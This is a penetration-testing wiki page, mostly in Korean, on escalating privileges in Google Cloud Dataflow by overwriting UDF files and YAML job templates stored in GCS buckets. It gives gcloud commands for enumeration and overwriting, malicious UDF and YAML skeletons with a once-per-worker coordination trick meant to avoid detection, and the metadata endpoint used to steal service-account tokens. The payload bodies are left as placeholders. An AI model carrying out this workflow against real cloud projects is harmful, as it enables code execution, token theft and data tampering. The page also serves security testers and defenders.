# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow는 GCS에 저장된 UDFs 및 job template YAML의 무결성을 검증하지 않습니다.
버킷에 대한 쓰기 권한이 있으면 이러한 파일을 덮어써서 코드 주입, 워커에서의 코드 실행, 서비스 계정 토큰 탈취 또는 데이터 처리 변경이 가능합니다.
배치 및 스트리밍 파이프라인 작업 모두 이 공격의 대상이 될 수 있습니다. 파이프라인에서 이 공격을 실행하려면 작업이 실행되기 전에, 작업 워커가 생성되기 전 초기 몇 분 동안(또는 autoscaling으로 인해 새로운 워커가 스핀업되기 전 작업이 실행되는 동안) UDFs/templates를 교체해야 합니다.

**Attack vectors:**
- **UDF hijacking:** 파이프라인에서 참조되고 고객 관리 버킷에 저장된 Python (`.py`) 및 JS (`.js`) UDFs
- **Job template hijacking:** 고객 관리 버킷에 저장된 커스텀 YAML 파이프라인 정의


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs 및 template callables는 **per row/line** 단위로 호출됩니다. 조율 없이 exfiltration 또는 token theft를 시도하면 수천 번 실행되어 노이즈, rate limiting 및 탐지를 유발합니다. **file-based coordination** 패턴을 사용하세요: 시작 시 마커 파일(예: `/tmp/pwnd.txt`)의 존재를 확인하고, 존재하면 악성 코드를 건너뛰며, 존재하지 않으면 페이로드를 실행하고 파일을 생성합니다. 이렇게 하면 페이로드는 **once per worker**로 실행되고, per line으로 여러 번 실행되는 것을 방지합니다.


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>작업을 나열하고 describe로 template 경로, staging 위치, 및 UDF 참조를 확인</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. GCS에서 원본 UDF 또는 작업 템플릿을 다운로드합니다:

<details>

<summary>버킷에서 UDF 파일 또는 YAML 템플릿 다운로드</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. 파일을 로컬에서 편집: 악성 페이로드를 주입(아래 Python UDF 또는 YAML 스니펫 참조)하고 run-once coordination pattern이 사용되도록 확인하세요.

4. 원본 파일을 덮어쓰도록 다시 업로드:

<details>

<summary>버킷에서 UDF 또는 템플릿 덮어쓰기</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. 다음 작업 실행을 기다리거나, (스트리밍의 경우) 오토스케일링을 트리거하세요(예: 파이프라인 입력을 범람시켜) 그러면 새로운 워커가 시작되어 수정된 파일을 가져옵니다.

#### Python UDF injection

워커가 데이터를 당신의 C2 서버로 exfiltrate하게 하려면 `urllib.request`를 사용하고 `requests`를 사용하지 마세요. `requests`는 classic Dataflow workers에 사전 설치되어 있지 않습니다.

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Job template YAML injection

조정 파일을 사용하는 callable을 포함하는 `MapToFields` 스텝을 주입하세요. YAML 기반 파이프라인에서 `requests`를 지원한다면 템플릿이 `dependencies: [requests]`를 선언한 경우 `requests`를 사용하고, 그렇지 않으면 `urllib.request`를 사용하세요.

파이프라인이 대상에 유효한 데이터를 계속 쓰도록 정리 단계(`drop: [malicious_step]`)를 추가하세요.

<details>

<summary>파이프라인 YAML의 악의적 `MapToFields` 스텝 및 정리</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine의 Dataflow Workers 접근 권한

**권한:** `compute.instances.osLogin` 또는 `compute.instances.osAdminLogin` (`worker SA`에 대해 `iam.serviceAccounts.actAs` 권한과 함께), 또는 `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (`iam.serviceAccounts.actAs` 권한과 함께) — 레거시 SSH 키 주입의 경우

Dataflow workers는 Compute Engine VM으로 실행됩니다. OS Login 또는 SSH를 통해 worker에 접근하면 메타데이터 엔드포인트(`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`)에서 SA 토큰을 읽거나, 데이터를 조작하거나 임의의 코드를 실행할 수 있습니다.

악용 세부사항은 다음을 참조하세요:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## 참고자료

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
